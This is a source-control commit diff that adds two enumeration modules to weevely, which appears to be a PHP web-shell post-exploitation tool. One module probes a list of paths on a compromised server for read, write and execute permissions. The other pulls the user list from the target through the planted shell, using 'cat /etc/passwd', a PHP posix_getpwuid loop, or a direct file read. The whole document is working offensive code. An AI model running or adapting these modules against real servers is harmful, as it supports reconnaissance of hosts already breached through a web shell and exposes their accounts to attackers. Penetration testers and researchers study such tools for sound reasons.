0b1516811407f07e2a91f03a7faa9dde5cbafed3
emilio.pinn <emilio.pinn@5205769a-2ae6-11df-b744-258d51847b74>
2011-10-19 17:23:17 +0000

    git-svn-id: http://weevely.googlecode.com/svn/trunk@167 5205769a-2ae6-11df-b744-258d51847b74

---
+++ modules/enum/paths.py
@@ -0,0 +1,40 @@
+
+
+from core.module import Module, ModuleException
+
+classname = 'Paths'
+
+class Paths(Module):
+    """Enumerate file paths. Load list list from file 
+    :enum.paths <path_list.txt> 
+    """
+     
+    def run(self, list_path, list = []):
+        
+        if not list and list_path:
+            try:
+                list=open(list_path,'r').read().splitlines()
+            except:
+                raise ModuleException(self.name,  "Error opening path list \'%s\'" % list_path)
+
+        for path in list:
+            
+            output = path + '' + '\t'*(3-((len(path)+1)/8))
+            
+            if self.modhandler.load('file.check').run(path, 'exists', quiet=True):
+                output += 'exists'
+                
+                if self.modhandler.load('file.check').run(path, 'r', quiet=True):
+                    output += ', +readable '
+                if self.modhandler.load('file.check').run(path, 'w', quiet=True):
+                    output += ', +writable '
+                if self.modhandler.load('file.check').run(path, 'x', quiet=True):
+                    output += ', +excutable '
+                                     
+            print output
+                        
+                    
+                    
+        
+        
+            
---
+++ modules/enum/users.py
@@ -0,0 +1,87 @@
+'''
+Created on 22/ago/2011
+
+@author: norby
+'''
+
+from core.module import Module, ModuleException
+
+classname = 'Users'
+    
+    
+class User:
+    
+    def __init__(self,line):
+           
+        linesplit = line.split(':')
+        
+        self.line = line
+        self.name = linesplit[0]
+        
+        if len(linesplit) > 5 and linesplit[5]:
+            self.home = linesplit[5]
+        else:
+            self.home = '/home/' + self.name
+            
+    
+class Users(Module):
+    """Enumerate system users using different techniques
+    :enum.users 
+    """
+    
+    vectors = { 
+               'shell.sh' : { "cat"       : "cat %s"
+                },
+               
+               'shell.php' : { 
+                              "posix_getpwuid" : "for($n=0; $n<2000;$n++) { $uid = @posix_getpwuid($n); if ($uid) echo join(':',$uid).\'\n\';  }",
+                              },
+               'file.read' : {
+                              "file.read" : "%s"
+                              }
+    }
+    
+
+    def __init__( self, modhandler , url, password):
+
+
+        Module.__init__(self, modhandler, url, password)
+        
+        self.usersinfo = {}
+        
+                
+    def run(self):
+        
+        
+        for interpreter in self.vectors:
+            for vector in self.vectors[interpreter]:
+                if interpreter in self.modhandler.loaded_shells or interpreter == 'file.read':
+                    payload = self.vectors[interpreter][vector] 
+                    
+                    if self.vectors[interpreter][vector].count('%s') == 1:
+                        payload = payload % ('/etc/passwd')
+                    
+                    try:    
+                        response = self.modhandler.load(interpreter).run(payload)
+                    except ModuleException:
+                        response = None
+                            
+    
+                    if response and ':0:0:' in response:
+                        
+                        print "[system.users] Users enumerated using method '%s'" % vector
+                        
+                        for line in response.split('\n'):
+                            
+                            user = User(line)
+                            self.usersinfo[user]=user
+                        
+                        return response
+
+        raise ModuleException(self.name,  "Users enumeration failed")
+        
+
+
+    
+    
+    
